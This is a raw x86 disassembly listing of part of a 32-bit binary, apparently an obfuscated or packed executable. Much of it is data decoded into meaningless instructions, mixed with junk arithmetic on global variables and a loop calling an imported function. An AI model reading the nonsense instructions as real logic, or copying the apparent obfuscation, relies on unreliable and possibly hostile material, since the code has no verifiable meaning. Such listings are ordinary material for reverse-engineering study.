  404099:	inc    ecx
  40409a:	(bad)
  40409e:	scas   eax,DWORD PTR es:[edi]
  40409f:	sbb    ebx,DWORD PTR [esi-0x2]
  4040a2:	out    0x38,al
  4040a4:	push   ss
  4040a5:	xor    dl,ah
  4040a7:	push   esi
  4040a8:	out    dx,al
  4040a9:	call   0x4c42:0xfffbbb36
  4040b0:	icebp  
  4040b1:	in     eax,0xe
  4040b3:	mov    edx,0x6ce066d9
  4040b8:	and    BYTE PTR [eax+0x6f],ch
  4040bb:	stc    
  4040bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040bd:	pop    ss
  4040be:	(bad)  
  4040bf:	fbld   TBYTE PTR [edx+0x28e00095]
  4040c5:	(bad)  
  4040c6:	scas   al,BYTE PTR es:[edi]
  4040c7:	cmc    
  4040c8:	ret    
  4040c9:	add    DWORD PTR [ecx],esi
  4040cb:	out    0x77,eax
  4040cd:	add    al,0xb3
  4040cf:	(bad)  
  4040d0:	rcr    BYTE PTR [edx+ebx*1-0x367e8262],0x8f
  4040d8:	sbb    eax,0xc18b8116
  4040dd:	pop    ebp
  4040de:	ret    0x18
  4040e1:	push   ebp
  4040e2:	mov    ebp,esp
  4040e4:	sub    esp,0x58
  4040e7:	xor    DWORD PTR ds:0x433633,0x2c9d
  4040f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4040f4:	sbb    eax,DWORD PTR ds:0x433673
  4040fa:	mov    eax,0x8a3a
  4040ff:	sub    DWORD PTR ds:0x4335ab,0x44c4
  404109:	xor    ax,WORD PTR [ecx+0x20]
  40410d:	sub    ecx,0x3d49
  404113:	mov    ecx,0x3b00
  404118:	xor    DWORD PTR ds:0x433547,0x649a
  404122:	add    ax,cx
  404125:	movzx  eax,ax
  404128:	mov    DWORD PTR [ebp-0xc],eax
  40412b:	mov    ecx,DWORD PTR ds:0x43365b
  404131:	and    DWORD PTR ds:0x433627,ecx
  404137:	mov    BYTE PTR [ebp-0x1],0x7f
  40413b:	sub    ecx,0x46a5
  404141:	lea    eax,[ebp-0x1]
  404144:	mov    DWORD PTR [ebp-0x10],eax
  404147:	adc    DWORD PTR ds:0x43353f,ecx
  40414d:	mov    al,BYTE PTR [ebp-0x1]
  404150:	movzx  ecx,WORD PTR ds:0x433543
  404157:	or     ecx,DWORD PTR ds:0x433597
  40415d:	mov    DWORD PTR ds:0x433543,ecx
  404163:	mov    ecx,DWORD PTR [ebp-0x10]
  404166:	xor    al,0x45
  404168:	sub    DWORD PTR ds:0x4335f3,0x7f5e
  404172:	sub    al,0x39
  404174:	mov    BYTE PTR [ecx],al
  404176:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40417d:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  404184:	add    DWORD PTR ds:0x43365b,ebx
  40418a:	mov    eax,DWORD PTR [ebp-0x8]
  40418d:	sbb    ecx,0x3751
  404193:	mov    ecx,0x7510853
  404198:	jmp    0x40436a
  40419d:	mov    ds,ebp
  40419f:	inc    eax
  4041a0:	add    DWORD PTR [ebx-0x6f],0x1318dd55
  4041a7:	and    edx,esp
  4041a9:	push   ebp
  4041aa:	mov    dh,0x3f
  4041ac:	mov    esi,0x7c7c24a8
  4041b1:	stos   DWORD PTR es:[edi],eax
  4041b2:	jg     0x404230
  4041b4:	jl     0x404149
  4041b6:	rcl    DWORD PTR [edx+0xf17e46a],cl
  4041bc:	cmc    
  4041bd:	or     DWORD PTR [edi],edi
  4041bf:	xor    ecx,DWORD PTR [ebp-0x137344db]
  4041c5:	icebp  
  4041c6:	mov    cl,0x4a
  4041c8:	push   0x547d6c85
  4041cd:	mov    bh,0x80
  4041cf:	inc    ebp
  4041d0:	xor    BYTE PTR [edi+0x64efadd0],al
  4041d6:	enter  0xd320,0x59
  4041da:	out    0x89,eax
  4041dc:	push   esp
  4041dd:	dec    edx
  4041de:	jge    0x4041df
  4041e0:	xor    ebp,DWORD PTR [eax+esi*2-0x78]
  4041e4:	int3   
  4041e5:	sbb    ebp,DWORD PTR ds:0xdf693226
  4041eb:	(bad)  
  4041ed:	add    al,0x21
  4041ef:	mov    al,ds:0xf2c21561
  4041f4:	dec    edx
  4041f5:	mov    DWORD PTR [edx-0x69c2d9a4],esp
  4041fb:	loopne 0x404235
  4041fd:	pop    ss
  4041fe:	out    0x25,eax
  404200:	push   esi
  404201:	pop    ebx
  404202:	fidiv  DWORD PTR [eax-0x55]
  404205:	scas   al,BYTE PTR es:[edi]
  404206:	pop    ecx
  404207:	mov    edx,0x84a9d637
  40420c:	pusha  
  40420d:	sub    cl,BYTE PTR [ebx+0x3d]
  404210:	add    BYTE PTR [ebp+0x7a],bh
  404213:	dec    edx
  404214:	js     0x4041f1
  404216:	std    
  404217:	add    DWORD PTR [edx-0x70],ebx
  40421a:	(bad)  
  40421c:	xchg   ebx,eax
  40421d:	cmp    al,0x62
  40421f:	inc    ebx
  404220:	cmp    DWORD PTR [eax+0x1b],edx
  404223:	push   cs
  404224:	mov    BYTE PTR [esi],0x5
  404227:	sub    dl,BYTE PTR [ebx]
  404229:	test   DWORD PTR [ebp+0x10],ebp
  40422c:	ds clc 
  40422e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40422f:	adc    al,0x5
  404231:	ds cs jecxz 0x4041cb
  404235:	outs   dx,BYTE PTR ds:[esi]
  404236:	sub    al,0xde
  404238:	fist   DWORD PTR [edx]
  40423a:	aaa    
  40423b:	test   BYTE PTR [ebp+0x38],0xf7
  40423f:	daa    
  404240:	bound  edx,QWORD PTR [ebx+esi*1-0x35]
  404244:	ficomp WORD PTR [eax+0x6b]
  404247:	shl    DWORD PTR [ebx+0x79],cl
  40424a:	xchg   ebp,eax
  40424b:	cmp    eax,esi
  40424d:	cs sbb eax,0xfd670e95
  404253:	arpl   WORD PTR ds:0x5122b89b,cx
  404259:	cmp    ch,al
  40425b:	sub    eax,0xd3cdcf91
  404260:	mov    al,0x74
  404262:	and    edx,0x77
  404265:	jg     0x4042af
  404267:	or     cl,BYTE PTR [ecx-0x4a5f05a3]
  40426d:	mov    ebp,0x7502d055
  404272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404273:	dec    eax
  404274:	or     BYTE PTR [ecx],ah
  404276:	or     DWORD PTR [ebp+0x61],ebx
  404279:	inc    ecx
  40427a:	mov    ecx,esp
  40427c:	adc    esp,DWORD PTR ds:0xeaa671f7
  404282:	sub    ebx,DWORD PTR [eax]
  404284:	sbb    al,BYTE PTR [ebx+ecx*1]
  404287:	push   ss
  404288:	and    dl,al
  40428a:	shl    BYTE PTR [ecx],cl
  40428c:	imul   esi,DWORD PTR [ebp+0x2f],0xf2bae34f
  404293:	pusha  
  404294:	jb     0x40427d
  404296:	pop    esi
  404297:	es aas 
  404299:	(bad)  
  40429a:	les    eax,FWORD PTR [ebx-0x1bc4ae85]
  4042a0:	push   eax
  4042a1:	out    0x13,eax
  4042a3:	daa    
  4042a4:	outs   dx,BYTE PTR ds:[esi]
  4042a5:	into   
  4042a6:	push   0x56
  4042a8:	mov    ebp,0xf6b7d6bd
  4042ad:	test   al,0xef
  4042af:	inc    ecx
  4042b0:	xor    eax,0x9ca5d53c
  4042b5:	mov    eax,ds:0x5f424674
  4042ba:	xchg   edi,eax
  4042bb:	add    DWORD PTR [esi],esp
  4042bd:	scas   al,BYTE PTR es:[edi]
  4042be:	inc    edi
  4042bf:	leave  
  4042c0:	sub    al,bh
  4042c2:	dec    ecx
  4042c3:	mov    eax,0xbdf94de2
  4042c8:	push   es
  4042c9:	mov    edx,0x839755e5
  4042ce:	pop    ebx
  4042cf:	cmp    bh,BYTE PTR [edx-0x60]
  4042d2:	int    0x65
  4042d4:	adc    al,0x6f
  4042d6:	(bad)  
  4042d7:	dec    edi
  4042d8:	push   esp
  4042d9:	bnd jl 0x40427e
  4042dc:	jae    0x404339
  4042de:	inc    esp
  4042df:	inc    esi
  4042e0:	(bad)  
  4042e2:	mov    edi,0x24d3cb16
  4042e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042e8:	adc    ebx,ebp
  4042ea:	adc    BYTE PTR [ebp-0x23],bl
  4042ed:	mov    ecx,0x636278d7
  4042f2:	imul   DWORD PTR [ebx]
  4042f4:	mov    edx,0xfb3900ea
  4042f9:	scas   al,BYTE PTR es:[edi]
  4042fa:	sbb    al,0x46
  4042fc:	adc    dl,ah
  4042fe:	aad    0x6c
  404300:	add    BYTE PTR [ebx+edi*4],0x17
  404304:	sar    DWORD PTR [ecx+0x3235df0c],1
  40430a:	sbb    DWORD PTR [edi+0x125dd218],ebp
  404310:	sub    BYTE PTR [ecx-0x42],bl
  404313:	jl     0x7ff22cec
  404319:	(bad)  
  40431a:	cmp    edx,esi
  40431c:	mov    esp,0x7b01738a
  404321:	and    dl,cl
  404323:	mov    dh,0xb5
  404325:	shr    BYTE PTR [ecx+edi*2-0x5f639ac1],1
  40432c:	ds mov edi,0xb5f52b2e
  404332:	in     eax,0x67
  404334:	push   edi
  404335:	jmp    0x404342
  404337:	aaa    
  404338:	and    edi,DWORD PTR [edi+0x17a11d73]
  40433e:	es mov edi,0x7701291b
  404344:	arpl   WORD PTR [ebx-0xa],dx
  404347:	cwde   
  404348:	(bad)  
  404349:	jecxz  0x40436d
  40434b:	sub    cl,al
  40434d:	loopne 0x40439c
  40434f:	xchg   ebx,eax
  404350:	sbb    BYTE PTR [ecx-0x10e0f8b1],bh
  404356:	mov    cl,0xab
  404358:	inc    edx
  404359:	and    cl,BYTE PTR [ebp-0xb]
  40435c:	and    ah,BYTE PTR [ebx+0x68]
  40435f:	shr    BYTE PTR [eax],1
  404361:	popa   
  404362:	push   0xffffff99
  404364:	je     0x404355
  404366:	mov    eax,es
  404368:	jae    0x40433d
  40436a:	push   esi
  40436b:	or     DWORD PTR ds:0x43361f,0x4643
  404375:	xor    eax,ecx
  404377:	add    DWORD PTR ds:0x43362f,0x1b4e
  404381:	mov    esi,0x32729a
  404386:	or     DWORD PTR ds:0x43362f,0x4335ef
  404390:	jmp    0x404562
  404395:	sub    ecx,DWORD PTR [edx]
  404397:	mov    esi,DWORD PTR [ebx-0x6dcc424b]
  40439d:	mov    cl,0x88
  40439f:	cmp    BYTE PTR [ecx],bh
  4043a1:	push   ecx
  4043a2:	ss ins DWORD PTR es:[edi],dx
  4043a4:	out    0x26,ax
  4043a7:	jl     0x404425
  4043a9:	stos   DWORD PTR es:[edi],eax
  4043aa:	jg     0x404428
  4043ac:	jl     0x40435b
  4043ae:	jae    0x404403
  4043b0:	ja     0x404347
  4043b2:	jl     0x404380
  4043b4:	sub    DWORD PTR [ecx-0x2d],ecx
  4043b7:	imul   ebp,DWORD PTR [edi-0x3],0xe2ff0e25
  4043be:	jecxz  0x40438c
  4043c0:	mov    esi,0xc229cba7
  4043c5:	cmc    
  4043c6:	stc    
  4043c7:	ret    
  4043c8:	lods   al,BYTE PTR ds:[esi]
  4043c9:	jmp    ebx
  4043cb:	mov    si,0x72c2
  4043cf:	rcr    BYTE PTR [edi+0x44cef56d],1
  4043d5:	dec    esp
  4043d6:	lahf   
  4043d7:	dec    esp
  4043d8:	mov    bh,0xca
  4043da:	jecxz  0x40444d
  4043dc:	and    al,0xfc
  4043de:	ret    
  4043df:	(bad)  
  4043e1:	pushf  
  4043e2:	pop    edi
  4043e3:	ja     0x4043c4
  4043e5:	lds    edi,FWORD PTR [ecx]
  4043e7:	jmp    0x5198:0x21672318
  4043ee:	les    ecx,FWORD PTR [eax-0x6a]
  4043f1:	clc    
  4043f2:	pop    ds
  4043f3:	ins    DWORD PTR es:[edi],dx
  4043f4:	das    
  4043f5:	mov    esi,0xc65331a5
  4043fa:	sti    
  4043fb:	push   es
  4043fc:	es popf 
  4043fe:	lea    esp,[ebp-0x1]
  404401:	inc    eax
  404402:	xchg   edi,edx
  404404:	lods   al,BYTE PTR ds:[esi]
  404405:	sahf   
  404406:	(bad)  
  404408:	fs cmp eax,0xa43adc63
  40440e:	jnp    0x404401
  404410:	sbb    eax,0x5e930f
  404415:	inc    edi
  404416:	(bad)  
  404417:	out    dx,eax
  404418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404419:	inc    ebp
  40441a:	sti    
  40441b:	arpl   WORD PTR ds:[esp+esi*1],bx
  40441f:	iret   
  404420:	ss jno 0x40441d
  404423:	xchg   ecx,eax
  404424:	pop    ss
  404425:	ret    0x8f08
  404428:	in     al,0xe7
  40442a:	or     BYTE PTR [edx+eiz*8],cl
  40442d:	in     al,dx
  40442e:	mov    WORD PTR [ecx],ss
  404430:	sub    al,BYTE PTR [ecx]
  404432:	xchg   si,ax
  404434:	xor    ebx,ebp
  404436:	dec    BYTE PTR [ecx+0x1c]
  404439:	sub    DWORD PTR [ebp-0x7],edi
  40443c:	xchg   ecx,eax
  40443d:	mov    bh,0x1f
  40443f:	aaa    
  404440:	mov    al,ds:0xdfc37fd
  404445:	rol    DWORD PTR [edi-0x461bc2df],0xc1
  40444c:	int    0xf4
  40444e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40444f:	add    eax,0xbd978795
  404454:	jmp    0x4044c3
  404456:	add    DWORD PTR [edx],esp
  404458:	nop
  404459:	adc    dl,BYTE PTR [edi]
  40445b:	xchg   edi,eax
  40445c:	cmp    ecx,ebx
  40445e:	aam    0x68
  404460:	inc    ebx
  404461:	pop    ds
  404462:	xor    DWORD PTR [esi],eax
  404464:	sti    
  404465:	push   ebx
  404466:	(bad)  
  404467:	into   
  404468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404469:	cmp    ebp,DWORD PTR [ebx+0x34]
  40446c:	pop    esi
  40446d:	cmp    edx,DWORD PTR [edi-0x4b2f5fe7]
  404473:	ret    0xaa54
  404476:	pushf  
  404477:	fisttp QWORD PTR [edx+eiz*2-0x79dbcea5]
  40447e:	sbb    DWORD PTR [ebp-0x726ac629],0xef589dd4
  404488:	jnp    0x40441b
  40448a:	cwde   
  40448b:	adc    edi,DWORD PTR [edi-0x3b]
  40448e:	jnp    0x404460
  404490:	in     eax,dx
  404491:	clc    
  404492:	imul   DWORD PTR [ecx-0x4d]
  404495:	push   es
  404496:	xor    ebp,0xfad156f1
  40449c:	(bad)  
  40449d:	sbb    eax,0x6006e9
  4044a2:	scas   eax,DWORD PTR es:[edi]
  4044a3:	mov    edx,0x9926c9ed
  4044a8:	fsubr  QWORD PTR [ecx+eiz*1]
  4044ab:	fwait
  4044ac:	add    eax,0x53722c23
  4044b1:	push   0x2a1634c1
  4044b6:	jne    0x4044e7
  4044b8:	mov    esi,0x1dbf9fac
  4044bd:	jp     0x40447a
  4044bf:	or     dl,BYTE PTR [esi-0x3c]
  4044c2:	jle    0x40451e
  4044c4:	stos   BYTE PTR es:[edi],al
  4044c5:	std    
  4044c6:	jmp    0x4044e2
  4044c8:	mov    ss,WORD PTR [ecx+0x4a]
  4044cb:	fcmovnu st,st(0)
  4044cd:	retf   
  4044ce:	xor    eax,0xb0ed5c96
  4044d3:	jmp    0xfdbc:0xfa3bd7d9
  4044da:	sahf   
  4044db:	push   ecx
  4044dc:	dec    edi
  4044dd:	pop    edi
  4044de:	xchg   esi,eax
  4044df:	and    BYTE PTR [ebp+eax*1-0x1c],ah
  4044e3:	lea    edx,[eax+0xf958151]
  4044e9:	js     0x404558
  4044eb:	mov    ds:0x5dc92616,al
  4044f0:	shl    DWORD PTR [esi],cl
  4044f2:	popa   
  4044f3:	dec    ebp
  4044f4:	stos   DWORD PTR es:[edi],eax
  4044f5:	inc    ebp
  4044f6:	lahf   
  4044f7:	mov    dl,0xe2
  4044f9:	data16 or al,0xa
  4044fc:	mov    edx,0x6d596b01
  404501:	pusha  
  404502:	pop    ebx
  404503:	ja     0x40449c
  404505:	push   esi
  404506:	sbb    esi,DWORD PTR [esi]
  404508:	mov    WORD PTR [ebx+0x4eedfd50],gs
  40450e:	or     ebx,esp
  404510:	mov    ds:0xb0bc61da,al
  404515:	imul   edx,DWORD PTR [edx-0x3cfc6829],0xe
  40451c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40451d:	das    
  40451e:	adc    DWORD PTR [ecx],edi
  404520:	or     dh,BYTE PTR [ebx-0x5fbc9d6b]
  404526:	push   eax
  404527:	retf   
  404528:	(bad)  
  404529:	sahf   
  40452a:	sbb    BYTE PTR [edx+0xf],bl
  40452d:	imul   esp,edi,0x194cc88
  404533:	outs   dx,BYTE PTR ds:[esi]
  404534:	and    al,0xc7
  404536:	jmp    0x404550
  404538:	stc    
  404539:	sti    
  40453a:	pusha  
  40453b:	sbb    BYTE PTR [ebp+eax*4-0x49],al
  40453f:	(bad)  
  404540:	lods   eax,DWORD PTR ds:[esi]
  404541:	fistp  WORD PTR [ecx]
  404543:	lods   al,BYTE PTR ds:[esi]
  404544:	pop    es
  404545:	and    eax,0xe43cee78
  40454a:	punpckhbw mm5,QWORD PTR [edi-0x31]
  40454e:	shl    dh,1
  404550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404551:	aas    
  404552:	xchg   edi,eax
  404553:	das    
  404554:	imul   ebx,DWORD PTR [eax-0x57],0xffffff92
  404558:	in     al,0xd4
  40455a:	stos   DWORD PTR es:[edi],eax
  40455b:	aad    0xac
  40455d:	jge    0x4045bd
  40455f:	outs   dx,DWORD PTR ds:[esi]
  404560:	(bad)  
  404561:	add    eax,DWORD PTR [ebx]
  404563:	(bad)  
  404564:	jmp    0x404757
  404569:	mov    DWORD PTR ds:0x4335a7,0x6267
  404573:	mov    dl,BYTE PTR [ebp-0x1]
  404576:	mov    DWORD PTR ds:0x433553,0x1c06
  404580:	jmp    0x404752
  404585:	rol    DWORD PTR [edx+edi*1],cl
  404588:	push   ss
  404589:	aad    0xd2
  40458b:	ror    ebp,cl
  40458d:	mov    eax,0xe6c2aa9d
  404592:	mov    ah,0x3c
  404594:	jmp    0x7cbc65ab
  404599:	stos   DWORD PTR es:[edi],eax
  40459a:	jg     0x404618
  40459c:	jl     0x40458b
  40459e:	stc    
  40459f:	push   eax
  4045a0:	xor    DWORD PTR [esi],eax
  4045a2:	adc    dl,BYTE PTR [ebx-0x10]
  4045a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045a6:	pop    es
  4045a7:	xchg   esp,eax
  4045a8:	test   BYTE PTR [ebp+0x2c],dh
  4045ab:	in     eax,0xd6
  4045ad:	icebp  
  4045ae:	push   ds
  4045af:	or     DWORD PTR [ebp-0x5bcee179],esi
  4045b5:	mov    ch,0x4b
  4045b7:	aad    0x78
  4045b9:	mov    eax,ds:0x8a90cca7
  4045be:	leave  
  4045bf:	icebp  
  4045c0:	ins    BYTE PTR es:[edi],dx
  4045c1:	jle    0x404596
  4045c3:	outs   dx,DWORD PTR ds:[esi]
  4045c4:	mov    ds:0xfa68e5b,al
  4045c9:	xor    eax,DWORD PTR [edi+0x71a8b658]
  4045cf:	retf   0x8aa
  4045d2:	mov    WORD PTR [edi-0x56],fs
  4045d5:	cli    
  4045d6:	mov    ds:0xd95082dc,eax
  4045db:	inc    esi
  4045dc:	mov    eax,ds:0x4bda19a3
  4045e1:	pop    esi
  4045e2:	jne    0x4045b8
  4045e4:	xchg   DWORD PTR [ecx-0x2e],edx
  4045e7:	stos   BYTE PTR es:[edi],al
  4045e8:	cmp    DWORD PTR [ebp-0x192fa56],ebp
  4045ee:	jmp    0xb8ba814f
  4045f3:	push   ss
  4045f4:	mov    edi,ecx
  4045f6:	or     DWORD PTR ds:[ecx],ebp
  4045f9:	call   0x4e744573
  4045fe:	inc    ebx
  4045ff:	dec    esp
  404600:	push   ss
  404601:	loopne 0x4045d7
  404603:	ret    
  404604:	lds    eax,FWORD PTR [eax+eax*8+0x618d6507]
  40460b:	cmp    eax,0x51d10ff
  404610:	xchg   ebp,eax
  404611:	adc    dh,cl
  404613:	fist   DWORD PTR [edx]
  404615:	test   bl,cl
  404617:	int    0x71
  404619:	cmp    al,0x40
  40461b:	push   eax
  40461c:	or     al,0x61
  40461e:	call   0x3b7d:0x8be1c979
  404625:	sbb    dl,BYTE PTR [edi]
  404627:	mov    ds:0x13e75088,eax
  40462c:	xor    dl,dl
  40462e:	aam    0x1
  404630:	rcr    cl,1
  404632:	lock mov ecx,0x54264888
  404638:	cwde   
  404639:	xchg   DWORD PTR [ecx],ecx
  40463b:	sub    DWORD PTR [ecx-0x5d],edi
  40463e:	jbe    0x40468f
  404640:	ins    BYTE PTR es:[di],dx
  404642:	daa    
  404643:	or     eax,0x444eb6cc
  404648:	jmp    0x9cf6e723
  40464d:	lea    ebp,[ecx+0x150d35a]
  404653:	das    
  404654:	das    
  404655:	or     DWORD PTR [ebx-0x115f36d0],edi
  40465b:	into   
  40465c:	rcr    BYTE PTR [edx-0x6e3747d9],1
  404662:	fwait
  404663:	scas   eax,DWORD PTR es:[edi]
  404664:	mov    cl,BYTE PTR [ecx-0x6c]
  404667:	jno    0x4046be
  404669:	aam    0x5a
  40466b:	cli    
  40466c:	ds in  al,0x6a
  40466f:	(bad)  
  404670:	mov    al,BYTE PTR [ebx]
  404672:	adc    bl,BYTE PTR [ecx]
  404674:	and    al,0x71
  404676:	mov    ah,0xd1
  404678:	jl     0x40466a
  40467a:	imul   ebx,DWORD PTR [ecx+0x43],0xffffffe4
  40467e:	mov    eax,0x338085d
  404683:	mov    dl,ch
  404685:	mov    ds:0xac031f3a,eax
  40468a:	add    eax,0xe817bdb3
  40468f:	dec    ecx
  404690:	ret    0x2a91
  404693:	mov    dl,0x39
  404695:	push   esi
  404696:	(bad)  
  404697:	div    BYTE PTR [eax+0x43]
  40469a:	dec    edx
  40469b:	and    al,0xcc
  40469d:	cmp    al,0x9b
  40469f:	lock sbb eax,0x226cbcd
  4046a5:	ins    BYTE PTR es:[edi],dx
  4046a6:	pop    esi
  4046a7:	out    dx,eax
  4046a8:	popf   
  4046a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046aa:	cmp    esp,DWORD PTR [ebx+0x40]
  4046ad:	xor    DWORD PTR [ebx+ebp*4+0x1f],esp
  4046b1:	fnsave [edx-0x7cd9ae6a]
  4046b7:	jmp    0xb999:0x166a6970
  4046be:	je     0x4046fa
  4046c0:	inc    esi
  4046c1:	add    bl,BYTE PTR [edx]
  4046c3:	cmc    
  4046c4:	dec    esp
  4046c5:	adc    al,0x4
  4046c7:	fldenv [ecx+eax*1-0x6511358c]
  4046ce:	adc    esi,edx
  4046d0:	out    0x57,eax
  4046d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046d3:	mov    dh,0x69
  4046d5:	aaa    
  4046d6:	pop    ss
  4046d7:	or     BYTE PTR [esi],ah
  4046d9:	add    eax,0xa41df7e7
  4046de:	sbb    BYTE PTR ds:0x7a079dae,cl
  4046e4:	loop   0x4046a7
  4046e6:	dec    edx
  4046e7:	in     eax,0xb7
  4046e9:	adc    al,0xc
  4046eb:	sbb    al,0xdb
  4046ed:	or     al,0xf0
  4046ef:	xor    cl,BYTE PTR [eax]
  4046f1:	sar    DWORD PTR [ecx+0x7a08de4],1
  4046f7:	js     0x40476e
  4046f9:	add    BYTE PTR [ebx+ecx*1-0x4956f4c3],ch
  404700:	push   esi
  404701:	xchg   ebp,eax
  404702:	stos   DWORD PTR es:[edi],eax
  404703:	shl    BYTE PTR [ebx+eiz*4-0x685d352c],1
  40470a:	icebp  
  40470b:	js     0x4046d9
  40470d:	pop    esp
  40470e:	push   eax
  40470f:	pop    edi
  404710:	or     dh,dl
  404712:	xor    al,0xf5
  404714:	adc    ebp,DWORD PTR [esp+ebx*4]
  404717:	push   0xb0a62fa2
  40471c:	addr16 repz in eax,0x12
  404720:	dec    ecx
  404721:	add    DWORD PTR [ecx+0xf7306e],0xffffffb7
  404728:	push   es
  404729:	call   0xfe4faca6
  40472e:	les    ebp,FWORD PTR [ecx]
  404730:	xlat   BYTE PTR ds:[ebx]
  404731:	mov    esi,0x184a1787
  404736:	mov    edx,0x3cb126cb
  40473b:	xor    eax,0x513076d4
  404740:	jb     0x4047aa
  404742:	addr16 dec ecx
  404744:	and    DWORD PTR [ebx],ebx
  404746:	mov    edx,0xc2cbe5fc
  40474b:	jle    0x4047a9
  40474d:	gs hlt 
  40474f:	sbb    BYTE PTR [edi+0x35],0x88
  404753:	push   esp
  404754:	add    eax,0x5c740a8
  404759:	dec    edi
  40475a:	xor    eax,0xde30043
  40475f:	add    BYTE PTR [eax],al
  404761:	cmp    eax,0x40
  404764:	jb     0x404569
  40476a:	sub    eax,DWORD PTR ds:0x433657
  404770:	mov    edx,DWORD PTR [ebp-0x8]
  404773:	mov    DWORD PTR ds:0x43353f,0x14
  40477d:	cmp    DWORD PTR ds:0x43353f,0x0
  404784:	je     0x4047dd
  40478a:	cmp    DWORD PTR ds:0x43353f,0xa
  404791:	jne    0x4047ab
  404797:	push   DWORD PTR [ebp-0x24]
  40479a:	push   DWORD PTR [ebp-0xc]
  40479d:	push   0x42f8
  4047a2:	push   DWORD PTR [ebp-0x24]
  4047a5:	call   DWORD PTR ds:0x4120bc
  4047ab:	cmp    DWORD PTR ds:0x43353f,0xb
  4047b2:	jne    0x4047c3
  4047b8:	mov    eax,ds:0x43353f
  4047bd:	dec    eax
  4047be:	mov    ds:0x43353f,eax
  4047c3:	mov    eax,ds:0x43353f
  4047c8:	dec    eax
  4047c9:	mov    ds:0x43353f,eax
  4047ce:	jmp    0x40477d
  4047d3:	or     DWORD PTR ds:0x4335e3,0x7ef0
  4047dd:	mov    eax,DWORD PTR [ebp-0xc]
  4047e0:	xor    edx,ecx
  4047e2:	xor    DWORD PTR ds:0x4335d7,0x43366f
  4047ec:	add    edx,esi
  4047ee:	cmp    edx,eax
  4047f0:	mov    DWORD PTR ds:0x4335db,0x5bbb
  4047fa:	je     0x404a4f
  404800:	sbb    DWORD PTR ds:0x4335e7,edi
  404806:	push   ebx
  404807:	or     DWORD PTR ds:0x4335f3,ebx
  40480d:	jmp    0x4049df
  404812:	and    eax,0xfd09dbf4
  404817:	sbb    eax,0xea31f0f5
  40481c:	push   edx
  40481d:	loope  0x40486e
  40481f:	mov    BYTE PTR [esi],dl
  404821:	(bad)  
  404822:	dec    ecx
  404823:	and    edi,DWORD PTR [esp+edi*2-0x55]
  404827:	jg     0x4048a5
  404829:	jl     0x4047c6
  40482b:	outs   dx,DWORD PTR ds:[esi]
  40482c:	mov    dh,0x7e
  40482e:	call   0x160d407c
  404833:	fs icebp 
  404835:	sub    al,0x5c
  404837:	cmp    edi,DWORD PTR [ebp+0xa]
  40483a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40483b:	(bad)  
  40483c:	retf   
  40483d:	xor    eax,0x6e36777e
  404842:	cmp    al,0x14
  404844:	push   ss
  404845:	pop    esp
  404846:	daa    
  404847:	loope  0x4048af
  404849:	xor    esi,DWORD PTR [edx]
  40484b:	enter  0x2930,0xc1
  40484f:	adc    BYTE PTR [esi*8+0x7ce88a7a],cl
  404856:	(bad)  
  404857:	aad    0x46
  404859:	mov    ah,BYTE PTR [edi-0x5b6a3033]
  40485f:	mov    edi,0xb623db72
  404864:	rcl    bh,cl
  404866:	and    edx,ebx
  404868:	clc    
  404869:	shr    BYTE PTR [esp+ebx*2+0x6b],1
  40486d:	loope  0x404836
  40486f:	loopne 0x40486d
  404871:	stos   DWORD PTR es:[edi],eax
  404872:	xor    eax,0xe1dbf38f
  404877:	fstp   DWORD PTR [eax]
  404879:	mov    al,ds:0xb38a96f5
  40487e:	jmp    0xb3b8:0x155b3531
  404885:	and    esi,DWORD PTR [ecx+eiz*2]
  404888:	mov    eax,ebx
  40488a:	fist   DWORD PTR [eax]
  40488c:	mov    bh,0x1b
  40488e:	daa    
  40488f:	inc    eax
  404890:	(bad)  
  404891:	mov    ebp,0x36ab250f
  404896:	mov    al,ds:0x6be0eaa
  40489b:	sub    dl,BYTE PTR [eax-0x80]
  40489e:	imul   ebx,DWORD PTR cs:[ebp-0x19],0xffffffdc
  4048a3:	or     BYTE PTR [ebx+0x5],dl
  4048a6:	bound  eax,QWORD PTR [eax-0x5b]
  4048a9:	mov    WORD PTR [edx+0x735441b4],ss
  4048af:	cdq    
  4048b0:	add    ebx,DWORD PTR [esi]
  4048b2:	push   es
  4048b3:	xchg   esp,eax
  4048b4:	rol    BYTE PTR [edi],cl
  4048b6:	pop    ebx
  4048b7:	cmp    eax,DWORD PTR [edi+0x3d07907c]
  4048bd:	rol    DWORD PTR [esi],1
  4048bf:	jo     0x4048f5
  4048c1:	jmp    0x404903
  4048c3:	or     ebp,esp
  4048c5:	dec    ebx
  4048c6:	int3   
  4048c7:	das    
  4048c8:	mov    dh,0x36
  4048ca:	adc    al,0x87
  4048cc:	jne    0x404904
  4048ce:	nop
  4048cf:	(bad)  
  4048d0:	and    esp,DWORD PTR [ebp+0x34]
  4048d3:	xchg   edx,eax
  4048d4:	mul    DWORD PTR [ebx-0x57]
  4048d7:	(bad)
  4048da:	retf   0x4db9
  4048dd:	add    DWORD PTR [ebp+0x13e4c038],0x51
  4048e4:	jecxz  0x4048dc
  4048e6:	fild   WORD PTR [ebp-0x16ea5248]
  4048ec:	push   ss
  4048ed:	in     al,0x63
  4048ef:	add    eax,DWORD PTR [eax+eax*1+0x6ba6646c]
  4048f6:	dec    ecx
  4048f7:	sbb    ecx,edx
  4048f9:	or     BYTE PTR [bp+si],al
  4048fc:	inc    DWORD PTR [edi-0x5a]
  4048ff:	iret   
  404900:	aas    
  404901:	adc    bl,BYTE PTR [edx-0x1e]
  404904:	jmp    0x3884:0xd30cee43
  40490b:	add    edi,DWORD PTR [ecx]
  40490d:	test   ah,dl
  40490f:	xor    ah,cl
  404911:	and    edx,ebp
